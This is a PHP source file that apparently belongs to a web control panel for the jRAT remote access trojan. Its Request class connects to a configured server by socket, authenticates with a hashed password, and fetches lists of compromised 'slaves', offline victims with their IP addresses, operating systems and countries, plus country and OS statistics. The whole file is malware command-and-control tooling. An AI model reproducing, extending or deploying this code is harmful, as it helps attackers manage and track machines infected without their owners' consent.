<?php

require_once "packets.php";
require_once "slave.php";
require_once "config.php";

class Request {
	
	public $sock;
	
	public function createSocket() {
		require_once "config.php";
		
		$this->sock = socket_create(AF_INET, SOCK_STREAM, 0) or die("Could not create socket\n");
		
		socket_connect($this->sock, ADDRESS, PORT);
		$error = socket_strerror(socket_last_error($this->sock));
		if (strpos($error, "successfully") === false) {
			$error = " Error: " . $error;
			$this->sock = $error;
			return $error;
		}
				
		$this->write(sha1(PASS));		
		
		return "";
	}
	
	public function getSlaves() {
		$this->write(PACKET_LIST);
		$raw = socket_read($this->sock, 1024 * 10, PHP_NORMAL_READ) or die("Could not read from socket\n");
		
		$slaveStrings = explode(";", $raw);
		$slaves = array();
		
		foreach ($slaveStrings as $string) {
			if (strlen($string) <= 1) {
				continue;
			}

			$s = new Slave();
			$s->makearray($string);
			array_push($slaves, $s);
		}
		
		return $slaves;
	}
	
	public function getOfflineClients() {
		$this->write(PACKET_LISTOFFLINE);	
		$raw = socket_read($this->sock, 1024 * 10, PHP_NORMAL_READ) or die("Could not read from socket\n");

		$rawStrings = explode(";", $raw);
		$slaves = array();
		
		foreach ($rawStrings as $string) {
			$data = explode(":", $string);
			
			if (strlen($string) <= 1) {
				continue;
			}
			
			$s = new Slave();
			$s->array = array(
				"userstring" => $data[0],				
				"os" => $data[1],			
				"strid" => $data[2],
				"version" => "jRAT " . $data[3],
				"ip" => $data[4],
				"country" => $data[5],
				"id" => $data[6],
				"selected" => "false",
				
				
				"ping" => "",
			);
			array_push($slaves, $s);
		}
		
		return $slaves;
	}
	
	public function getCountryStats() {
		$this->write(PACKET_LISTCOUNTRIES);
		$raw = socket_read($this->sock, 1024 * 10, PHP_NORMAL_READ) or die("Could not read from socket\n");
		
		$rawStrings = explode(";", $raw);
		$countries = array();
		
		foreach ($rawStrings as $string) {
			if (strlen($string) <= 1) {
				continue;
			}
		
			$split = explode(",", $string);
			$countries[$split[0]] = $split[1];
		}
		
		return $countries;
	}
	
	public function getOperatingSystemStats() {
		$this->write(PACKET_LISTOPERATINGSYSTEMS);
		$raw = socket_read($this->sock, 1024 * 10, PHP_NORMAL_READ) or die("Could not read from socket\n");
	
		$rawStrings = explode(";", $raw);
		$os = array();
	
		foreach ($rawStrings as $string) {
			if (strlen($string) <= 1) {
				continue;
			}
	
			$split = explode(",", $string);
			$os[$split[0]] = $split[1];
		}
	
		return $os;
	}

	
	public function disconnect() {
		$this->write(PACKET_DISCONNECT);
		socket_close($this->sock);
	}
	
	public function write($s) {
		socket_write($this->sock, $s . "\n", strlen($s) + 1) or die("Failed to write to socket\n");
	}
	
 	public function isError() {
 		return is_string($this->sock) && strpos($this->sock, "Error") == 1;
 	}
 	
 	public function redirectError() {
 		if ($this->isError()) {
 			// header("Location: error.php?desc=" . str_replace(" Error: ", "", $this->sock));
 			exit();
 		}
 	}
}